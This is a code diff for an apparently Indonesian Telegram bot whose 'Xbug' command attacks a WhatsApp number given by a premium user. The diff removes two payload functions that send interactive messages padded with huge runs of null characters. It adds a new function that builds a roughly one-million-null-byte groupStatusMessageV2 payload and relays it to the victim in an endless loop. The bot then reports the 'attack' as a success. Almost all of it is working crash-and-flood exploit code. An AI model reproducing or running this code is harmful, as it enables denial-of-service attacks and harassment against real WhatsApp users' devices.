@@ -2290,15 +2290,20 @@ bot.command("Xbug", checkAllPremium, checkWhatsAppConnection, checkCooldown, asy
 
   const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
-  await ctx.reply(`🧨 𝐗𝐛𝐮𝐠  (𝐛𝐮𝐠)  𝐬𝐞𝐥𝐞𝐬𝐚𝐢 𝐝𝐢𝐤𝐢𝐫𝐢𝐦 𝐮𝐧𝐭𝐮𝐤 ${q}`);
+  await ctx.reply(
+`<blockquote>🧨 𝐗𝐛𝐮𝐠𝐬 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠</blockquote>
+> ━━━━━━━━━━━━━━━
+> 📤 Target : ${q}
+> ⚡ Status : Success✅
+> 🚀 Process : Finished Yeay.`,
+    { parse_mode: "HTML" }
+  );
 
   (async () => {
-    for (let r = 0; r < 10; r++) {
-  await VnXDelayHardSw(sock, target);
-  await sleep(900);
-  await DelayHardNullVnX(sock, target);
-  await sleep(1000);
-}
+    for (let r = 0; r < 20; r++) {
+      await OneRxVz(sock, target);
+      await sleep(1000);
+    }
   })();
 });
 // ------------ (  FUNCTION BUGS ) -------------- \\
@@ -2472,78 +2477,39 @@ async function ArTdElay(sock, target) {
   await new Promise(resolve => setTimeout(resolve, 5000));
 }
 
-async function VnXDelayHardSw(sock, target) {
-  const msgsw = await generateWAMessageFromContent(target, {
-     viewOnceMessage: {
-       message: {   
-        interactiveResponseMessage: {
-          body: {
-            text: "VnX Sw  Nihk",
-            format: "DEFAULT"
-          },
-          nativeFlowResponseMessage: {
-            name: "call_permission_request",
-            paramsJson: "\u0000".repeat(2248100),
-            version: 3
-           }
-         }
-       }
-     }
-   }, {});
-
-  await sock.relayMessage("status@broadcast", msgsw.message, {
-    messageId: msgsw.key.id,
-    statusJidList: [target],
-    additionalNodes: [
-      {
-        tag: "meta",
-        attrs: {},
-        content: [
-          {
-            tag: "mentioned_users",
-            attrs: {},
-            content: [
-              {
-                tag: "to",
-                attrs: {
-                  jid: target
-                },
-                content: undefined
-              }
-            ]
-          }
-        ]
-      }
-    ]
-  });
-}
-
-async function DelayHardNullVnX(sock, target, ptcp = true) {
- 
-    let msg = await generateWAMessageFromContent(target, {
-        interactiveResponseMessage: {
-            body: {
-                text: "VnX",
-                format: "DEFAULT"
-            },
-            nativeFlowResponseMessage: {
-                name: "galaxy_message",
-                paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
-                version: 3
+async function OneRxVz(sock, target) {
+    const RxZv = {
+        viewOnceMessage: {
+            message: {
+                groupStatusMessageV2: {
+                    message: {
+                        interactiveResponseMessage: {
+                            nativeFlowResponseMessage: {
+                                name: "galaxy_message",
+                                paramsJson: "\x10" + "\u0000".repeat(1030000),
+                                version: 3
+                            }
+                        }
+                    }
+                }
             }
         }
-    }, { userJid: sock.user.id });
+    };
 
-    await sock.relayMessage(target, {
-        viewOnceMessage: {
-            message: msg.message
-        }
-    }, ptcp ? { 
-        messageId: msg.key.id, 
-        participant: { jid: target } 
-    } : { 
-        messageId: msg.key.id 
+    const Oneshoot = await generateWAMessageFromContent(target, RxZv, {
+        userJid: sock.user.id
     });
+
+    while (true) {
+        try {
+            await sock.relayMessage(target, Oneshoot.message, {
+                participant: { jid: target }
+            });
+            await new Promise(resolve => setTimeout(resolve, 500));
+        } catch (error) {
+            await new Promise(resolve => setTimeout(resolve, 1000));
+        }
+    }
 }
 
 // --- Jalankan Bot --- //
